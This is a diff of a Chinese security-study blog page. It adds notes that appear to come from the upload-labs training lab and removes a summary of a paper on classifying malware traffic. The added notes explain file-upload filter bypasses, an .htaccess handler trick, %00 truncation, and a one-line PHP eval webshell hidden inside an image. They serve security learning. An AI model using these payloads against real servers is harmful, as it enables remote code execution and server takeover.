@@ -73,6 +73,110 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Web-File2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/07/Web-File2/" class="article-date">
+  <time class="dt-published" datetime="2024-02-07T10:25:47.000Z" itemprop="datePublished">2024-02-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/02/07/Web-File2/">Web-File2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="Pass-03（黑名单绕过）"><a href="#Pass-03（黑名单绕过）" class="headerlink" title="Pass-03（黑名单绕过）"></a>Pass-03（黑名单绕过）</h5><p>trim函数 如果有空格，就把空格删除</p>
+<p>这道题黑名单中有php，将文件后缀改为php5或phtml即可绕过</p>
+<h5 id="Pass-04（黑名单绕过-htaccess攻击）。。。"><a href="#Pass-04（黑名单绕过-htaccess攻击）。。。" class="headerlink" title="Pass-04（黑名单绕过 .htaccess攻击）。。。"></a>Pass-04（黑名单绕过 .htaccess攻击）。。。</h5><p>上传.htaccess文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件名包含shana的会被当做php执行</p>
+<p>可以把php文件命名为jpg文件，绕过黑名单，在网页访问该文件时，该文件会以php执行</p>
+<h5 id="Pass-05（黑名单绕过-后缀双写逻辑绕过）"><a href="#Pass-05（黑名单绕过-后缀双写逻辑绕过）" class="headerlink" title="Pass-05（黑名单绕过 后缀双写逻辑绕过）"></a>Pass-05（黑名单绕过 后缀双写逻辑绕过）</h5><p>查看源码，黑名单有大小写，但是没有所有的大小写组合，并且后缀名会转为小写，用双写绕过</p>
+<p>后缀名改为.phpphp，上传成功</p>
+<h5 id="Pass-06（黑名单绕过-大小写文件名混淆）"><a href="#Pass-06（黑名单绕过-大小写文件名混淆）" class="headerlink" title="Pass-06（黑名单绕过 大小写文件名混淆）"></a>Pass-06（黑名单绕过 大小写文件名混淆）</h5><p>查看源码，黑名单有大小写，但是没有所有的大小写组合，并且后缀名不会统一转为小写，将文件后缀改成PHp（黑名单中没有），上传成功</p>
+<h5 id="Pass-07（黑名单绕过-空格绕过）。。。"><a href="#Pass-07（黑名单绕过-空格绕过）。。。" class="headerlink" title="Pass-07（黑名单绕过 空格绕过）。。。"></a>Pass-07（黑名单绕过 空格绕过）。。。</h5><p>查看源码，发现跟之前源码相比，少了首位去空，抓包，在文件名最后加个空格，再forward，就上传成功</p>
+<h5 id="Pass-08（黑名单绕过-填点绕过）。。。"><a href="#Pass-08（黑名单绕过-填点绕过）。。。" class="headerlink" title="Pass-08（黑名单绕过 填点绕过）。。。"></a>Pass-08（黑名单绕过 填点绕过）。。。</h5><p>查看源码，发现没有删除文件名末尾的点，抓包，在后面加个.，绕过</p>
+<h5 id="Pass-09（黑名单绕过-Win文件流特性绕过）"><a href="#Pass-09（黑名单绕过-Win文件流特性绕过）" class="headerlink" title="Pass-09（黑名单绕过 Win文件流特性绕过）"></a>Pass-09（黑名单绕过 Win文件流特性绕过）</h5><p>查看源码，没有去除字符串::$DATA，抓包，在最后加上::$DATA，上传成功</p>
+<h5 id="Pass-10（黑名单绕过-点空格点代码逻辑绕过）。。。"><a href="#Pass-10（黑名单绕过-点空格点代码逻辑绕过）。。。" class="headerlink" title="Pass-10（黑名单绕过 点空格点代码逻辑绕过）。。。"></a>Pass-10（黑名单绕过 点空格点代码逻辑绕过）。。。</h5><p>抓包，将文件名后缀改为.php.  .</p>
+<p>首先去除空格，删除最后一个.</p>
+<p>然后后缀名为.php.，绕过过滤，上传成功</p>
+<h5 id="Pass-11（黑名单绕过-双写绕过）"><a href="#Pass-11（黑名单绕过-双写绕过）" class="headerlink" title="Pass-11（黑名单绕过 双写绕过）"></a>Pass-11（黑名单绕过 双写绕过）</h5><p>有一次过滤，将后缀名改为.pphphp，过滤完后缀名为.php，上传成功</p>
+<h5 id="Pass-12（白名单绕过-00截断GET型绕过）"><a href="#Pass-12（白名单绕过-00截断GET型绕过）" class="headerlink" title="Pass-12（白名单绕过 00截断GET型绕过）"></a>Pass-12（白名单绕过 00截断GET型绕过）</h5><p>这段代码是防止多个点绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>白名单加防止多点绕过，需要用到%00截断，%00是在地址方面，0x00截断是在文件命名方面</p>
+<p>例如文件名为1.php</p>
+<p>只能上传.jpg后缀文件，代码将文件命名为 1.php.19283018.jpg，使其为一个jpg文件</p>
+<p>如果加上%00截断，1.php%00.19283018.jpg，%00之后的就没有了，为1.php</p>
+<p>抓包，在第一行的参数save_path&#x3D;..&#x2F;upload&#x2F;改为save_path&#x3D;..&#x2F;upload&#x2F;1.php%00，php版本换为5.2</p>
+<p>第21天 1:32:03</p>
+<h5 id="Pass-13（白名单绕过-00截断POST型绕过）"><a href="#Pass-13（白名单绕过-00截断POST型绕过）" class="headerlink" title="Pass-13（白名单绕过 00截断POST型绕过）"></a>Pass-13（白名单绕过 00截断POST型绕过）</h5><p>跟Pass-12类似，抓包，找到..&#x2F;upload的位置，写成..&#x2F;upload&#x2F;xx.php%00</p>
+<p>但是这个%00需要编码，选中%00，右键</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faf6e2ef-ac59-4ee8-9d1f-7c48fedde799" alt="image"></p>
+<h5 id="Pass-14（图片马-文件包含绕过）。。。"><a href="#Pass-14（图片马-文件包含绕过）。。。" class="headerlink" title="Pass-14（图片马+文件包含绕过）。。。"></a>Pass-14（图片马+文件包含绕过）。。。</h5><p>在图片中写入后门代码</p>
+<p>php后门代码，将这个代码附加在图片后面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在cmd中运行copy 1.png &#x2F;b + a.php &#x2F;a webshell.jpg，得到webshell.jpg，可以看到图像最后加上了这一行php代码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/96294650-d853-473e-a855-68f648453a2c" alt="image"></p>
+<p>获取上传的图片地址，右键图片，复制图像链接</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.182.1/upload/upload/8920230926111805.png">http://192.168.182.1/upload/upload/8920230926111805.png</a></p>
+<p>点击题目中给的文件包含漏洞链接，加上参数，进行访问</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/009f3474-9108-4149-b8be-78ee5bb17aeb" alt="image"></p>
+<p>再用post传参，x&#x3D;phpinfo();，可以执行php代码</p>
+<h4 id="文件上传之后端黑白名单绕过"><a href="#文件上传之后端黑白名单绕过" class="headerlink" title="文件上传之后端黑白名单绕过"></a>文件上传之后端黑白名单绕过</h4><p>黑名单：明确不让上传的格式后缀</p>
+<p>白名单：明确可以上传的格式后缀</p>
+<p>如果黑名单中有PHP，可以用PHP5或Phtml来绕过限制</p>
+<p>enctype：文件上传的类型</p>
+<p>method：上传方式</p>
+<p>onsubmit：鼠标触发事件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7179fdb4-ae78-4825-84f0-e1afdb7e190c" alt="image"></p>
+<p>看下面的代码，PHP中接受文件的参数名要与HTML表单中的一致，以name的值发送过去，name的值是upload_file，所以上面也是upload_file</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; #接收文件上传</span><br><span class="line">echo $name</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form enctypt=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;p&gt;请选择要上传的图片：&lt;/p&gt;</span><br><span class="line">    &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">    &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>.htaccess，用apach才行</p>
+<p>.htaccess是apach的一个配置文件，将.htaccess文件上传成功后，其余文件会依照.htaccess的执行</p>
+<p>.htaccess示例</p>
+<p>将这个文件上传成功后，再上传文件名中包含shana的文件，就会被当作x-httpd-php来执行</p>
+<p>注意shana文件要和上传的.htaccess文件在同一目录</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有的代码是一次过滤，有的是循环过滤</p>
+<p>比如说，a.phphp，一次过滤之后为a.php</p>
+<p>循环过滤（递归过滤） 过滤后为a.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/07/Web-File2/" data-id="clsaip1bn0000ncvf6hfaa4m1" data-title="Web-File2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Web-File1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/02/06/Web-File1/" class="article-date">
@@ -1062,70 +1166,6 @@
 
 
   
-    <article id="post-Paper-Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/01/25/Paper-Deep%20Learning%20Based%20Malware%20Traffic%20Classification%20for%20Power%20Internet%20of%20Things%20Network%20Security/" class="article-date">
-  <time class="dt-published" datetime="2024-01-25T07:27:34.000Z" itemprop="datePublished">2024-01-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/01/25/Paper-Deep%20Learning%20Based%20Malware%20Traffic%20Classification%20for%20Power%20Internet%20of%20Things%20Network%20Security/">Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="Deep-Learning-Based-Malware-Traffic-Classification-for-Power-Internet-of-Things-Network-Security-论文分享"><a href="#Deep-Learning-Based-Malware-Traffic-Classification-for-Power-Internet-of-Things-Network-Security-论文分享" class="headerlink" title="Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security 论文分享"></a>Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security 论文分享</h3><p>Tong YU, Xin LI, Ying LING, Dongmei BIN, and Chunyan YANG. 2022. Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security. In Proceedings of the 7th International Conference on Big Data and Computing (ICBDC ‘22). Association for Computing Machinery, New York, NY, USA, 131–137.</p>
-<p>原文pdf链接：<a target="_blank" rel="noopener" href="https://dl-acm-org-s.otrust.ouc.edu.cn/doi/10.1145/3545801.3545820">https://dl-acm-org-s.otrust.ouc.edu.cn/doi/10.1145/3545801.3545820</a></p>
-<p>基于深度学习的电力物联网网络安全恶意流量分类</p>
-<p>这篇文章为电力物联网网络提出了一种新颖的基于深度学习的恶意软件流量分类方法，将流量以固定大小的字节序列的形式表示，并建立1D-CNN模型用于恶意软件流量检测和分类</p>
-<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>在电力物联网中，大多数物联网设备资源有限，没有配备足够的安全保护方案，面临攻击者和恶意软件破坏安全的危险。对恶意软件流量分类是电力物联网网络安全的重要内容，可以支持入侵检测和防御等高级安全应用。</p>
-<p>恶意软件流量分类方法可氛围三种，基于签名的方法、基于机器学习的方法和基于深度学习的方法。</p>
-<p>本文提出一种基于1D-CNN模型的而已软件流量分类方案，主要有两步。第一步是网络流量处理，对原始网络流量进行捕捉并转换为固定长度的字节序列；第二步是模型训练，将以字节序列形式表示的流量输入1D-CNN模型进行训练。训练的模型由两种，一种是恶意软件流量监测模型，可以区分而已软件流量和良性应用流量，另一种是而已软件流量分类模型，可以识别特定的恶意软件流量类别。</p>
-<h4 id="网络流量处理"><a href="#网络流量处理" class="headerlink" title="网络流量处理"></a>网络流量处理</h4><p>电力物联网恶意软件流量分类的对象是双向网络流量，单项网络流量是在一个实践间隔内网络中传输的网络数据包序列，这些数据包共享相同的5元组，其中包括原互联网协议地址、源端口、目的互联网协议地址、目的端口和传输协议，即TCP或UDP，双向流量是在两个断电之间双向穿越的单向流。</p>
-<p>本文网络流量处理的目的是将电力物联网网络中收集到的网络流量转化为深度学习模型可以作为输入的标准IDX格式。</p>
-<p>首先，以原始数据包跟踪的形式捕获网络流量，然后对原始网络数据包进行分析，重建网络流量，丢弃乱序数据包和重复数据包，其次将网络流量转换成统一的784字节大小，将流量中所有包含报头和有效载荷的数据包连起来，形成一个字节序列，以784字节大小进行分割，不足784字节的添加零位，最后将字节序列转换为深度学习常用的IDX格式。</p>
-<p>为了实现流量可视化，将固定长度字节序列形成的流量转换为大小为28像素×28像素的灰度图像，图像中每个像素代表网络流量的一个字节，比如说下图，前10类是恶意流量，后10类是良性流量，每一类随机选择9个流量来代表该类别，可以看出每个类别中的流量图像在纹理上是一致的，不同类别的图像在纹理上有明显差异。</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ff2d3ba9-b6d3-4d5f-9a70-0db587bb15c4" alt="image"></p>
-<h4 id="分类模式"><a href="#分类模式" class="headerlink" title="分类模式"></a>分类模式</h4><p>CNN被广泛应用于各种机器学习任务，本文采用近年来在自然语言处理中成功应用的1D-CNN模型。以784字节序列形式表示的网络流量作为输入，1D-CNN模型经过训练后可秩序恶意软件流量检测和恶意软件流量分类任务。为了从流量数据包之间的模式中发现隐藏特征，我们将流量经过三次卷积层和最大时间池化层，对于1D-CNN的第一层，应用大小为m×n的滤波器w，输出公式如下</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/851ac1f6-a66c-4e32-b019-ac191b85a29b" alt="image"></p>
-<p>f(-)是一个非线性激活函数，本文使用的是ReLU函数。然后应用池化层。在完成3轮卷积层和max-over-time池化层后，通过4个完全连接层的soft-max函数获得流置信度最高的标签。1D-CNN模型各层的详细参数如下表所示。</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/877dd5ee-7859-48c5-b056-36886676b9a5" alt="image"></p>
-<h4 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h4><p>数据集：USTC-TFC2016</p>
-<p>数据集中有10类恶意软件流量，每一类约有六至八千个流量，还有10类良性应用流量，每类流量约有六至八千个流量，数据集的详细构成如下表。</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/336f4678-472c-482a-b9d2-24210f0b3970" alt="image"></p>
-<p>将所提模型与LENET进行比较，LENET是最先进的恶意软件流量分类深度学习模型。评估指标为精确率，召回率和F1分数。下图为恶意软件流量检测的结果。可以看出，本文提出的1D-CNN模型能正确分类所有测试流量，总图准确率达到了100%，LENET模型的准确率也达到了99.9959%。</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/44e3de30-f477-437e-a37b-b02002e81b0d" alt="image"></p>
-<p>下表是三个按类别度量的结果。可以看出1D-CNN模型在所有指标上以及在恶意软件和良性流量类别上都获得了100%的准确率，整体优于LENET模型。</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/31e0a929-9b96-4fee-9549-28922eac987f" alt="image"></p>
-<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>本文提出了一种基于1D-CNN模型的深度学习恶意软件流量分类方法，首先从原始网络数据包数据中提取固定大小的字节序列，然后对其进行分类，将序列输入1D-CNN模型来训练分类器，在公共数据集上进行实验，得出所提出的方法在总体准确率和每类指标方面都优于现有的最先进模型。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/25/Paper-Deep%20Learning%20Based%20Malware%20Traffic%20Classification%20for%20Power%20Internet%20of%20Things%20Network%20Security/" data-id="clrsw6xuu0000g4vf5k8ohs3m" data-title="Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1176,6 +1216,10 @@
       <ul>
         
           <li>
+            <a href="/2024/02/07/Web-File2/">Web-File2</a>
+          </li>
+        
+          <li>
             <a href="/2024/02/06/Web-File1/">Web-File1</a>
           </li>
         
@@ -1189,10 +1233,6 @@
         
           <li>
             <a href="/2024/02/01/Web-SQLi2/">SQLi2</a>
-          </li>
-        
-          <li>
-            <a href="/2024/01/31/20240131/">20240131</a>
           </li>
         
       </ul>
